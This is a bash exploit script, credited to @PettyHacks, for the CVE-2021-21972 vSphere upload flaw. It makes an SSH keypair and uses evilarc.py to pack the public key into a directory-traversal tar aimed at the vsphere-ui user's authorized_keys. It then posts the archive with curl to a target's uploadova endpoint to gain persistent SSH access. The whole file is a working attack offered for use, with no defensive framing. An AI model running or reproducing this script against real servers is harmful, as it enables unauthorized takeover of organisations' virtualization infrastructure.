#!/bin/bash

#Prerequisites:
#	Download the evilarc.py script from https://github.com/ptoomey3/evilarc and place it in the same directory as this script.

#Automated Steps:
#	1. Create SSH Keypair
#	2. Add your public key into directory traversal archive w/ evilarc
#	3. Send request to vSphere to add your ssh key to the authorized_keys directory (it will create one if one does not exists)



echo "  ______     _______     ____   ___ ____  _      ____  _  ___ _____ ____  
 / ___\ \   / / ____|   |___ \ / _ \___ \/ |    |___ \/ |/ _ \___  |___ \ 
| |    \ \ / /|  _| _____ __) | | | |__) | |_____ __) | | (_) | / /  __) |
| |___  \ V / | |__|_____/ __/| |_| / __/| |_____/ __/| |\__, |/ /  / __/ 
 \____|  \_/  |_____|   |_____|\___/_____|_|    |_____|_|  /_//_/  |_____|"


echo ""
echo "written by @PettyHacks"
echo "-----------------------------------------------------------------------------------------"i
echo ""
echo "Enter Target URL: (Example: https://url/ui/vropspluginui/rest/services/uploadova)"

read URL

echo "Target: $URL"
echo ""

#Step 1
echo "Will now generate ssh keys in the current working directory:"
pwd
echo ""

ssh-keygen -t rsa -f "21972-key" -P ""

echo ""
echo "Now renaming 21972-key.pub to authorized_keys"
mv 21972-key.pub authorized_keys
chmod 600 21972-key

#Step 2
echo ""
echo "Will now build directory traversal archive:"
python evilarc.py -d 5 -p 'home/vsphere-ui/.ssh' -o unix -f linexpl.tar authorized_keys

#Step 3
echo ""
echo "Ready to fire payload at target. Press any key to continue:"
read blah
curl -k --form "uploadFile=@linexpl.tar" $URL
echo ""
echo ""
echo "Done!"
